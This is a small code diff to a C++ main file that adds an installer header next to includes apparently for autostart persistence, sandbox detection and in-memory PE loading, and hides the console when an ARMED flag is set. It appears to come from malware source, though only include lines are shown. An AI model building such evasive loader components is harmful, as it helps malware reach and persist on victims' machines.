@@ -4,6 +4,7 @@
 #include "data/data-autostart.h"
 #include "sandboxdetect/sandboxdetect.h"
 #include "memory-load/loadpe.h"
+#include "installer/installer.h"
 
 int main(int argc, char* argv[]) {
 	if constexpr (ARMED) FreeConsole();
